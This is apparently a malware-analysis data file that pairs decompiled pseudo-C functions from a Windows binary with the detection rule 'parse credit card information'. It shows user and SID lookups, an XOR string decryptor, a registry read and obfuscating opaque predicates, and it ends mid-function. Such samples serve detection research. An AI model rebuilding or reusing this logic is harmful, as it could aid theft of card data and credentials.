{
    "00401000": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004010d4) overlaps instruction at (ram,0x004010d3)\n// \n\nuint __cdecl fcn.00401000(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ushort in_DX;\n    uchar *unaff_ESI;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 20480 named .text\n    pcbBuffer = 0x104;\n    if ((*0x10 != 0x320) && (*0x10 == 0x320)) {\n        out(*unaff_ESI, in_DX);\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar1 != 0) {\n        uVar2 = in(0x5d);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 386
    },
    "004019d0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid fcn.004019d0(void)\n\n{\n    uint uVar1;\n    \n    if (*0x422624 == 0) {\n        uVar1 = (*_sym.imp.MSVCRT.dll_time)(0);\n        (*_sym.imp.MSVCRT.dll_srand)(uVar1);\n        *0x422624 = 1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00402480": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004027c4) overlaps instruction at (ram,0x004027c3)\n// \n\nuint fcn.00402480(void)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t extraout_CH;\n    uint8_t uVar6;\n    ushort extraout_CX;\n    char extraout_CH_00;\n    uchar *extraout_ECX;\n    uint8_t extraout_DL;\n    uint8_t extraout_DL_00;\n    uint8_t uVar7;\n    int16_t extraout_DX;\n    int32_t extraout_EDX;\n    int32_t *piVar8;\n    uint8_t *unaff_EBX;\n    uint *puVar9;\n    uint *unaff_EBP;\n    uint *puVar10;\n    uchar *unaff_ESI;\n    int32_t unaff_EDI;\n    uchar *puVar11;\n    ushort in_SS;\n    bool bVar12;\n    uchar uVar13;\n    bool bVar14;\n    bool bVar15;\n    unkbyte10 extraout_ST0;\n    ulong uVar16;\n    ushort uVar17;\n    uint arg_14h;\n    uint in_stack_ffffa195;\n    uint in_stack_ffffa199;\n    uint8_t *arg_14h_00;\n    uint in_stack_ffffffdc;\n    uint in_stack_ffffffe0;\n    uint uVar18;\n    \n    uVar7 = unaff_EBX >> 8;\n    bVar12 = 0xcf < uVar7;\n    bVar14 = uVar7 == 0xd0;\n    uVar18 = 0x4024a2;\n    fcn.004010e0(0x407014, 0x11, 0x411188, 0x11);\n    if ((bVar12 || bVar14) || (!bVar12 && !bVar14)) {\n        uVar18 = 0xf;\n        in_stack_ffffffe0 = 0x4113a4;\n        in_stack_ffffffdc = 0x11;\n    }\n    *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffdc;\n    fcn.004010e0(0x407014, in_stack_ffffffdc, in_stack_ffffffe0, uVar18);\n    fcn.004010e0(0x407014, 0x11, 0x4113b4, 0x1a);\n    uVar6 = extraout_CH | extraout_DL | 0x1f;\n    bVar12 = uVar6 == 0;\n    uVar13 = (POPCOUNT(uVar6) & 1U) == 0;\n    fcn.004010e0(0x407014, 0x11, 0x411408, 10);\n    puVar10 = unaff_EBP;\n    if ((!bVar12) && (bVar12)) {\n        puVar9 = &stack0xffffffe4;\n        puVar10 = &stack0xffffffe4;\n        cVar1 = '\\x10';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    fcn.004010e0(0x407014, 0x11, 0x411414, 0xb);\n    if ((!uVar13) && (uVar13)) {\n        puVar9 = &stack0xffffa171;\n        cVar1 = '\\x1e';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar10;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar18 = in(0x78);\n        return uVar18;\n    }\n    fcn.004010e0(0x407014, 0x11, 0x411420, 8);\n    fcn.004010e0(0x407014, 0x11, 0x411428, 9);\n    fcn.004010e0(0x407014, 0x11, 0x411434, 9);\n    fcn.004010e0(0x407014, 0x11, 0x411440, 9);\n    iVar2 = fcn.004010e0(0x407014, 0x11, 0x41144c, 0xc);\n    bVar12 = ((unaff_EDI | 0x74e3) - iVar2 & 0x1a8) == 0;\n    fcn.004010e0(0x407014, 0x11, 0x411458, 3);\n    if ((bVar12) || (uVar17 = extraout_CX,  !bVar12)) {\n        uVar17 = 0;\n    }\n    puVar11 = CONCAT22(uVar17, in_SS);\n    fcn.004010e0(0x407014, 0x11, 0x41145c, 0x47);\n    bVar12 = false;\n    bVar15 = false;\n    bVar14 = uVar7 == 0;\n    arg_14h = 0x11;\n    uVar18 = 0x407014;\n    uVar16 = fcn.004010e0(0x407014, 0x11, 0x411468, 0x40);\n    iVar5 = uVar16 >> 0x20;\n    pcVar3 = uVar16;\n    if ((bVar15) || (!bVar15)) {\ncode_r0x00402687:\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*extraout_ECX, unaff_EBX);\n        *(iVar5 + 0x11) = *(iVar5 + 0x11) + (extraout_ECX >> 8);\n        iVar2 = fcn.004010e0(0x407014, 0x56, uVar18, arg_14h);\n        bVar12 = (puVar11 & (extraout_DX - iVar2) + 0x1abU) == 0;\n        in_stack_ffffa199 = 0xb;\n        in_stack_ffffa195 = 0x407014;\n        uVar4 = fcn.004010e0(0x407014, 0x11, 0x407014, 0xb);\n        if ((bVar12) || (!bVar12)) {\n            in_stack_ffffa195 = 4;\n        }\n        bVar12 = (uVar4 & 0x46a18c5) == 0;\n        fcn.004010e0(0x407014, 0x11, 0x4114c0, 0x47);\n        iVar5 = extraout_EDX;\n        if (bVar12) goto code_r0x00402711;\n    }\n    else {\n        uVar13 = in(uVar16 >> 0x20);\n        *puVar11 = uVar13;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n        puVar11 = puVar11 + 1;\n        if (bVar12 || bVar14) goto code_r0x00402687;\n        *pcVar3 = *pcVar3 + uVar16;\n        bVar12 = *pcVar3 == '\\0';\n    }\n    if (bVar12) {\n        out(*unaff_ESI, iVar5);\n    }\ncode_r0x00402711:\n    uVar16 = fcn.004010e0(0x407014, 0x11, 0x4114c4, 4);\n    piVar8 = uVar16 >> 0x20;\n    *(uVar16 + -0x7ce92414) = extraout_ST0;\n    *piVar8 = *piVar8 + 0xc6adf84;\n    iVar5 = fcn.004010e0(0x407014, 0x11, 0x4114c8, unaff_EBX);\n    if ((SCARRY4(&stack0xffffa161, 0x40) != &stack0xffffa1a1 < 0) ||\n       (arg_14h_00 = unaff_EBX,  SCARRY4(&stack0xffffa161, 0x40) == &stack0xffffa1a1 < 0)) {\n        arg_14h_00 = 0x4;\n        in_stack_ffffa199 = 0x4114d4;\n        in_stack_ffffa195 = 0x11;\n    }\n    *(iVar5 + 0x11) = *(iVar5 + 0x11) + extraout_CH_00;\n    fcn.004010e0(0x407014, in_stack_ffffa195, in_stack_ffffa199, arg_14h_00);\n    uVar7 = extraout_DL_00 ^ unaff_EBX >> 8 | 0x67;\n    uVar13 = uVar7 < '\\0';\n    bVar12 = uVar7 == 0;\n    fcn.004010e0(0x407014, 0x11, 0x4114d8, 9);\n    if ((!bVar12) && (bVar12)) {\n        puVar9 = &stack0xffffa18d;\n        cVar1 = '\\x10';\n        do {\n            puVar10 = puVar10 + -1;\n            puVar9 = puVar9 + -1;\n            *puVar9 = *puVar10;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar18 = 0x4027b4;\n    fcn.004010e0(0x407014, 0x11, 0x4114e4, 0x16);\n    if ((uVar13) || (!uVar13)) {\n        uVar18 = 7;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    uVar18 = fcn.004010e0(0x407014, 0x11, 0x4114fc, uVar18);\n    return uVar18;\n}\n",
        "token_count": 2373
    },
    "004027e0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.004027e0(uint param_1, uint param_2)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint16_t extraout_DX;\n    uint extraout_EDX;\n    uint16_t unaff_BX;\n    int32_t unaff_EDI;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    float10 fVar7;\n    uint arg_8h;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h;\n    \n    while( true ) {\n        uVar3 = param_1;\n        bVar4 = uVar3 < param_2;\n        bVar6 = SBORROW1(uVar3, '\\x01');\n        bVar5 = uVar3 == 1;\n        fcn.004010e0(0x407014, 0x11, 0x411504, 0x20);\n        if ((bVar4 || bVar5) || (!bVar4 && !bVar5)) break;\n        param_1 = extraout_ECX;\n        param_2 = extraout_EDX;\n        if (!bVar6) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.004010e0(0x407014, 0x11, 0x411524, 0x26);\n    fcn.004010e0(0x407014, 0x11, 0x41154c, 8);\n    fcn.004010e0(0x407014, 0x11, 0x411554, 0x19);\n    fcn.004010e0(0x407014, 0x11, 0x411570, 0xb);\n    fcn.004010e0(0x407014, 0x11, 0x41157c, 0x12);\n    fcn.004010e0(0x407014, 0x11, 0x411590, 0x12);\n    arg_14h = 2;\n    arg_10h = 0x4115a4;\n    arg_ch = 0x11;\n    arg_8h = 0x407014;\n    while( true ) {\n        uVar1 = fcn.004010e0(arg_8h, arg_ch, arg_10h, arg_14h);\n        bVar4 = false;\n        bVar6 = false;\n        bVar5 = (((uVar1 & 0xff | (uVar1 >> 8 & extraout_DX >> 8) << 8) * 2 | extraout_DX) ^ 0x6c00) == unaff_BX;\n        arg_14h = 8;\n        arg_10h = 0x4115a8;\n        arg_ch = 0x11;\n        arg_8h = 0x407014;\n        fcn.004010e0(0x407014, 0x11, 0x4115a8, 8);\n        if ((bVar4 || bVar5) || (!bVar4 && !bVar5)) break;\n        if (!bVar6) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    iVar2 = fcn.004010e0(0x407014, 0x11, 0x4115b0, 8);\n    iVar2 = extraout_ECX_00 - iVar2;\n    uVar1 = iVar2 & 0xff00 | iVar2 ^ iVar2 >> 8 | 0x3d00 | unaff_BX;\n    bVar4 = (uVar1 >> 8) - uVar1 < '\\0';\n    fVar7 = fcn.004010e0(0x407014, 0x11, 0x4115b8, 6);\n    if ((!bVar4) && (bVar4)) {\n        *(unaff_EDI + 0x1c) = fVar7;\n    }\n    fcn.004010e0(0x407014, 0x11, 0x4115c0, 7);\n    fcn.004010e0(0x407014, 0x11, 0x4115c8, 7);\n    fcn.004010e0(0x407014, 0x11, 0x4115d0, 6);\n    fcn.004010e0(0x407014, 0x11, 0x4115d8, 0x25);\n    fcn.004010e0(0x407014, 0x11, 0x411600, 8);\n    return;\n}\n",
        "token_count": 1101
    },
    "00402ac0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402b2c) overlaps instruction at (ram,0x00402b2a)\n// \n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00402ac0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    char cVar6;\n    int32_t iVar5;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t unaff_EBX;\n    int32_t unaff_EDI;\n    uint8_t uVar9;\n    bool bVar10;\n    uint8_t in_AF;\n    uint *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    if (0 < arg_14h) {\n        var_ch = 0x1;\n        uVar7 = arg_14h * 2;\n        do {\n            uVar3 = *(var_4h + arg_10h);\n            uVar9 = unaff_EBX >> 8 < arg_10h >> 8;\n            bVar10 = (POPCOUNT(unaff_EDI - 1U & 0xff) & 1U) != 0;\n            pcVar8 = var_ch % arg_ch;\n            uVar4 = pcVar8[arg_8h];\n            unaff_EBX = unaff_EBX & 0xffffff00;\n            iVar5 = arg_8h;\n            if ((bVar10) && (!bVar10)) {\n                puVar2 = var_ch + 1;\n                out(*var_ch, pcVar8);\n                uVar9 = in_AF;\n                do {\n                    cVar6 = iVar5 >> 8;\n                    uVar9 = 9 < (iVar5 & 0xf) | uVar9;\n                    iVar5 = CONCAT31(CONCAT21(iVar5 >> 0x10, cVar6 - uVar9), -uVar9);\n                    var_ch = puVar2;\n                    in_AF = uVar9;\n                } while (uVar9 || cVar6 == *pcVar8);\n            }\n            piVar1 = unaff_EDI + pcVar8 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - uVar9;\n            *((uVar7 & 0xffffff00 | uVar3) + 0x52) = iVar5;\n            var_8h._0_1_ = arg_14h * 2;\n            *(arg_18h + -1 + var_ch) = var_8h ^ uVar3 ^ *((var_ch + -1) % arg_ch + arg_8h);\n            *(var_ch + arg_18h) = var_8h ^ uVar4;\n            var_4h = var_4h + 1;\n            uVar7 = arg_14h;\n            var_ch = var_ch + 2;\n        } while (var_4h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 731
    },
    "004048b0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404926) overlaps instruction at (ram,0x00404924)\n// \n\nvoid __cdecl\nfcn.004048b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t extraout_EDX;\n    int16_t unaff_DI;\n    uint *puVar2;\n    char cVar3;\n    char cVar4;\n    int32_t arg_18h_00;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402ac0(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    cVar4 = '\\0';\n    cVar3 = unaff_DI < 0;\n    fcn.00402ac0(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    if ((cVar4 != cVar3) || (iVar1 = extraout_EDX,  arg_18h_00 = arg_1ch,  cVar4 == cVar3)) {\n        iVar1 = arg_20h + 0xa0;\n        arg_18h_00 = iVar1;\n    }\n    fcn.00402ac0(arg_18h, arg_1ch, arg_20h & 0xffffff00 | *0x52000000, 0x20, arg_18h_00);\n    fcn.00402ac0(arg_18h, arg_1ch, arg_14h, 0x20, iVar1 + 0xe0);\n    iVar1 = fcn.00404860();\n    if (iVar1 == -1) {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar1 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar1;\n    }\n    var_10ch = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    var_4h = 0x104;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.004050a0(0x80000001, 0x4113d0, 0x4113fc, &var_8h, &var_10ch, &var_4h);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, 0x41144c),  iVar1 == 0)) {\n        *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n    }\n    return;\n}\n",
        "token_count": 731
    },
    "004010e0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.004010e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    bool bVar5;\n    uint uStack28;\n    int32_t var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    puVar3 = &var_1h + 1;\n    var_8h = 0;\n    iVar2 = arg_14h;\n    if (0 < arg_14h) {\n        do {\n            var_1h._0_1_ = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            bVar5 = (POPCOUNT(var_1h) & 1U) != 0;\n            if ((bVar5) && (!bVar5)) {\n                puVar4 = &uStack28;\n                cVar1 = '\\x1e';\n                do {\n                    puVar3 = puVar3 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *puVar3;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n                iVar2 = in(0x78);\n                return iVar2;\n            }\n            *(var_8h + arg_10h) = arg_14h ^ var_1h;\n            iVar2 = var_8h + 1;\n            var_8h = iVar2;\n        } while (iVar2 < arg_14h);\n    }\n    return iVar2;\n}\n",
        "token_count": 421
    },
    "00401a20": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401b9d) overlaps instruction at (ram,0x00401b9b)\n// \n// WARNING: Removing unreachable block (ram,0x00401a98)\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00401a20(void)\n\n{\n    int32_t *piVar1;\n    char cVar4;\n    uint32_t uVar2;\n    uchar *puVar3;\n    uint *extraout_ECX;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t unaff_EBX;\n    uint32_t *puVar7;\n    uint *unaff_ESI;\n    int32_t unaff_EDI;\n    uint *puVar8;\n    ushort in_SS;\n    uint8_t uVar9;\n    bool bVar10;\n    uint8_t in_AF;\n    bool bVar11;\n    ulong uVar12;\n    int32_t iVar13;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar13 = unaff_EDI;\n    uVar2 = fcn.004014c0();\n    bVar11 = uVar2 == 0;\n    bVar10 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n    if (bVar11) {\n        return 0;\n    }\n    if ((!bVar10) && (bVar10)) {\n        segment(in_SS, *0x10 + -0x90);\n        if (bVar10) {\n            (*_sym.imp.MSVCRT.dll_time)();\n            uVar2 = (*_sym.imp.MSVCRT.dll_srand)();\n            *0x422624 = 1;\n            return uVar2;\n        }\n        bVar11 = *0x10 == 0x8c;\n        iVar13 = -0x4843615b;\n    }\n    bVar10 = false;\n    uVar2 = fcn.004043b0(iVar13);\n    if ((!bVar11) && (bVar11)) {\n        puVar7 = unaff_EBX + 1;\n        if (bVar10 || puVar7 == NULL) {\n            *puVar7 = *puVar7 | unaff_ESI;\n            *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e);\n            return uVar2;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - puVar7;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    iVar13 = fcn.00404480();\n    if (iVar13 != -1) {\n        return 0;\n    }\n    fcn.00402480();\n    *0x42261c = 1;\n    iVar13 = fcn.00401ec0();\n    if (iVar13 != 0) {\n        return 0;\n    }\n    var_20h = 0;\n    var_80h._0_1_ = 0;\n    puVar8 = &var_1fh;\n    for (iVar13 = 7; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    var_60h._0_1_ = 0;\n    puVar8 = &var_80h + 1;\n    for (iVar13 = 7; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    var_40h._0_1_ = 0;\n    puVar8 = &var_60h + 1;\n    for (iVar13 = 7; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    puVar8 = &var_40h + 1;\n    for (iVar13 = 7; iVar13 != 0; iVar13 = iVar13 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    iVar13 = fcn.00401c00(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar13 == 0) {\n        return 0;\n    }\n    uVar12 = fcn.00403470();\n    puVar6 = uVar12 >> 0x20;\n    puVar3 = uVar12;\n    uVar9 = 0;\n    bVar10 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    if ((bVar10) || (!bVar10)) {\n        puVar3 = &var_20h;\n        puVar5 = &var_60h;\n        puVar6 = &var_80h;\n    }\n    else {\n        out(*unaff_ESI, uVar12 >> 0x20);\n        uVar9 = in_AF;\n        do {\n            cVar4 = puVar3 >> 8;\n            uVar9 = 9 < (puVar3 & 0xf) | uVar9;\n            puVar3 = CONCAT31(CONCAT21(puVar3 >> 0x10, cVar4 - uVar9), -uVar9);\n            puVar5 = extraout_ECX;\n        } while (uVar9 || cVar4 == *puVar6);\n    }\n    piVar1 = puVar8 + puVar6 * 2 + 3;\n    *piVar1 = (*piVar1 + 0x7b) - uVar9;\n    *(puVar5 + -0x73) = puVar3;\n    iVar13 = fcn.00404a50();\n    return iVar13 != 0;\n}\n",
        "token_count": 1509
    },
    "00401f00": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402215) overlaps instruction at (ram,0x00402214)\n// \n// WARNING: Removing unreachable block (ram,0x004021d2)\n// WARNING: Removing unreachable block (ram,0x004020de)\n// WARNING: Removing unreachable block (ram,0x004022da)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.00401f00(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint8_t uVar3;\n    uchar uVar4;\n    ushort uVar5;\n    ushort uVar6;\n    int16_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    uint8_t extraout_CL;\n    uint16_t extraout_CX;\n    ushort extraout_CX_00;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    int32_t extraout_EDX;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar10;\n    uint16_t uVar11;\n    uint8_t *unaff_EDI;\n    uchar *puVar12;\n    char *pcVar13;\n    uint *puVar14;\n    ushort in_ES;\n    ushort in_SS;\n    bool bVar15;\n    bool bVar16;\n    uint8_t in_AF;\n    uchar uVar17;\n    uchar uVar18;\n    char cVar19;\n    char cVar20;\n    uint8_t uVar21;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar22;\n    char cVar23;\n    bool bVar24;\n    uint8_t uVar25;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint uVar26;\n    ulong in_stack_00000014;\n    ushort uVar27;\n    uchar uVar28;\n    uchar uVar29;\n    ushort uVar30;\n    uint16_t uVar31;\n    uint16_t uVar32;\n    ushort uVar33;\n    ushort uVar34;\n    ushort uVar35;\n    ushort uVar36;\n    \n    uVar26 = in_stack_00000014 >> 0x10;\n    bVar22 = false;\n    fcn.004010e0(0x407014, 0x11, 0x41119c, 10);\n    fcn.004010e0(0x407014, 0x11, 0x4111a8, 0x12);\n    fcn.004010e0(0x407014, 0x11, 0x4111bc, 4);\n    fcn.004010e0(0x407014, 0x11, 0x4111c0, 0xc);\n    fcn.004010e0(0x407014, 0x11, 0x4111cc, 7);\n    fcn.004010e0(0x407014, 0x11, 0x4111d4, 0xb);\n    uVar3 = fcn.004010e0(0x407014, 0x11, 0x4111e0, 0xc);\n    puVar14 = unaff_EDI + 1;\n    cVar20 = uVar3 - *unaff_EDI;\n    uVar31 = (in_NT & 1) * 0x4000 | SBORROW1(uVar3, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar20 < '\\0') * 0x80 | (cVar20 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar20) & 1U) == 0) * 4\n             | uVar3 < *unaff_EDI;\n    uVar32 = (in_ID & 1) * 0x20 | (in_VIP & 1) * 0x10 | (in_VIF & 1) * 8 | (in_AC & 1) * 4;\n    puVar10 = unaff_ESI + -1;\n    func_0x10187f71();\n    uVar9 = extraout_EDX + 8;\n    uVar28 = 0xec;\n    uVar29 = 0x11;\n    uVar30 = 0x41;\n    uVar6 = 0x11;\n    uVar27 = 0;\n    uVar4 = 0x14;\n    uVar18 = 0x70;\n    uVar5 = 0x40;\n    do {\n        fcn.004010e0(CONCAT22(uVar5, CONCAT11(uVar18, uVar4)), CONCAT22(uVar27, uVar6), \n                     CONCAT22(uVar30, CONCAT11(uVar29, uVar28)), CONCAT22(uVar32, uVar31));\n        uVar11 = puVar14;\n        puVar14 = puVar14 & 0xffff0000;\n        while( true ) {\n            puVar14 = puVar14 & 0xffff0000 | uVar11;\n            fcn.004010e0(0x407014, 0x11, 0x4111f4, 0xd);\n            bVar15 = false;\n            cVar23 = '\\0';\n            cVar20 = unaff_EBX >> 8;\n            cVar19 = cVar20 < '\\0';\n            uVar17 = cVar20 == '\\0';\n            bVar16 = (POPCOUNT(cVar20) & 1U) == 0;\n            uVar11 = 0;\n            uVar8 = fcn.004010e0(0x407014, 0x11, 0x411204, 0x18);\n            if (!bVar16) break;\ncode_r0x00402086:\n            uVar28 = 0x1c;\n            uVar29 = 0x12;\n            uVar30 = 0x41;\n            uVar6 = 0x11;\n            uVar27 = 0;\n            uVar3 = fcn.004010e0(0x407014, 0x11, 0x41121c, 0x25);\n            if ((uVar17 || cVar23 != cVar19) || (!uVar17 && cVar23 == cVar19)) goto code_r0x004020ab;\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            if (extraout_ECX != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n        }\n        uVar31 = uVar8;\n        uVar32 = uVar8 >> 0x10;\n        if (!bVar16) goto code_r0x00402086;\n        puVar1 = segment(in_SS, *0x10 + -0x20);\n        if (bVar15) break;\n        if (!bVar16) {\n            cVar23 = '\\0';\n            cVar19 = &stack0xffffffe4 < 0;\n            uVar17 = *0x10 == 0x1c;\n            goto code_r0x00402086;\n        }\n    } while( true );\n    cVar23 = '\\0';\n    cVar19 = *puVar1 < '\\0';\n    pcVar2 = swi(0x74);\n    (*pcVar2)();\ncode_r0x004020ab:\n    uVar5 = 0x7014;\n    uVar4 = fcn.004010e0(0x407014, 0x11, 0x411244, 10);\n    if ((cVar23 == cVar19) && (cVar23 != cVar19)) {\n        puVar10 = unaff_ESI + -2;\n        puVar12 = puVar14 | uVar9;\n        puVar14 = puVar12 + 1;\n        *puVar12 = uVar4;\n        in_SS = uVar5;\n    }\n    fcn.004010e0(0x407014, 0x11, 0x411250, 0xc);\n    fcn.004010e0(0x407014, 0x11, 0x41125c, 0xd);\n    fcn.004010e0(0x407014, 0x11, 0x41126c, 6);\n    fcn.004010e0(0x407014, 0x11, 0x411274, 5);\n    fcn.004010e0(0x407014, 0x11, 0x41127c, 0xd);\n    uVar4 = extraout_DH < extraout_CL;\n    cVar19 = SBORROW1(extraout_DH, extraout_CL);\n    cVar20 = extraout_DH - extraout_CL < '\\0';\n    uVar18 = extraout_DH == extraout_CL;\n    uVar6 = 0x7014;\n    uVar5 = fcn.004010e0(0x407014, 0x11, 0x41128c, 0x19);\n    if ((cVar19 == cVar20) && (cVar19 != cVar20)) {\n        puVar10 = puVar10 + -1;\n        pcVar13 = puVar14 | uVar9;\n        puVar14 = pcVar13 + 1;\n        *pcVar13 = uVar5;\n        uVar4 = 0;\n        uVar18 = uVar5 + (uVar5 >> 8) * 'y' == '\\0';\n        in_SS = uVar6;\n    }\n    fcn.004010e0(0x407014, 0x11, 0x4112a8, 0xf);\n    if ((!uVar4 && !uVar18) && (uVar4 || uVar18)) {\n        do {\n    // 